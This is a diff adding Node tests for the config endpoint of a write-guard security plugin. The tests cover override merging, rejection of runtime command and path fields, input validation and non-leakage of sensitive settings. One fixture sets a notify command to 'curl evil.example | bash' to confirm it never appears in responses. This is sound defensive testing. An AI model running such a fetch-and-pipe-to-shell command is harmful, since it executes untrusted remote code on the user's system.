@@ -29,7 +29,7 @@ function mount(options = {}) {
       tools: { register() {} },
       get: (name) => services[name],
     },
-    { audit: false, integrity: false, quarantine: false, notify: false },
+    { audit: false, integrity: false, quarantine: false, notify: false, ...(options.profileConfig || {}) },
   )
   return {
     home,
@@ -186,4 +186,76 @@ test('only the changed key reaches the override file', async (t) => {
   await call(route, 'POST', JSON.stringify({ set: { mode: 'dry-run' } }))
   const saved = JSON.parse(readFileSync(m.configFile, 'utf8'))
   assert.deepEqual(saved, { mode: 'dry-run' })
+})
+
+test('a runtime override does not reset its untouched siblings', async (t) => {
+  // profile turns obfuscation off; the panel then flips download-execute only.
+  const m = mount({ conn: allowAll, profileConfig: { contentChecks: { obfuscation: false } } })
+  t.after(m.restore)
+  const route = m.routes.get('/dsh-write-guard/config')
+  const before = await call(route, 'GET')
+  assert.equal(before.body.config.contentChecks.obfuscation, false, 'profile value must survive mount')
+
+  const saved = await call(route, 'POST', JSON.stringify({ set: { contentChecks: { 'download-execute': true } } }))
+  assert.equal(saved.body.config.contentChecks['download-execute'], true)
+  assert.equal(saved.body.config.contentChecks.obfuscation, false, 'sibling must keep the profile value')
+
+  const cleared = await call(route, 'POST', JSON.stringify({ clear: ['contentChecks'] }))
+  assert.equal(cleared.body.config.contentChecks.obfuscation, false, 'clear falls back to the profile')
+})
+
+test('path- and command-bearing fields cannot be set at runtime', async (t) => {
+  const m = mount({ conn: allowAll })
+  t.after(m.restore)
+  const route = m.routes.get('/dsh-write-guard/config')
+  for (const key of ['notifyCommand', 'auditFile', 'quarantineDir', 'rulesFile', 'ignorePaths', 'allowRules']) {
+    const { code } = await call(route, 'POST', JSON.stringify({ set: { [key]: 'x' } }))
+    assert.equal(code, 400, key)
+  }
+  assert.equal(existsSync(m.configFile), false)
+})
+
+test('an invalid value is rejected and nothing is written', async (t) => {
+  const m = mount({ conn: allowAll })
+  t.after(m.restore)
+  const route = m.routes.get('/dsh-write-guard/config')
+  const cases = [
+    { blockThreshold: 'seventy' },
+    { blockThreshold: 500 },
+    { mode: 'nope' },
+    { scriptPolicy: 'maybe' },
+    { maxScanBytes: -1 },
+  ]
+  for (const set of cases) {
+    const { code } = await call(route, 'POST', JSON.stringify({ set }))
+    assert.equal(code, 400, JSON.stringify(set))
+  }
+  assert.equal(existsSync(m.configFile), false)
+})
+
+test('a valid value survives the round trip unchanged', async (t) => {
+  const m = mount({ conn: allowAll })
+  t.after(m.restore)
+  const route = m.routes.get('/dsh-write-guard/config')
+  const { code, body } = await call(route, 'POST', JSON.stringify({ set: { blockThreshold: 80 } }))
+  assert.equal(code, 200)
+  assert.equal(body.config.thresholds.block, 80)
+})
+
+test('the response never carries a command, a path, or an absolute file', async (t) => {
+  const m = mount({ conn: allowAll, profileConfig: { notifyCommand: 'curl evil.example | bash' } })
+  t.after(m.restore)
+  const route = m.routes.get('/dsh-write-guard/config')
+  for (const response of [await call(route, 'GET'), await call(route, 'POST', JSON.stringify({ set: { mode: 'dry-run' } }))]) {
+    const text = JSON.stringify(response.body)
+    assert.ok(!text.includes('evil.example'), 'notifyCommand leaked')
+    assert.ok(!text.includes(':\\') && !text.includes(':/'), 'absolute path leaked')
+  }
+})
+
+test('maxVerifyBytes is reported as needing a restart', async (t) => {
+  const m = mount({ conn: allowAll })
+  t.after(m.restore)
+  const { body } = await call(m.routes.get('/dsh-write-guard/config'), 'GET')
+  assert.ok(body.restartOnly.includes('maxVerifyBytes'))
 })
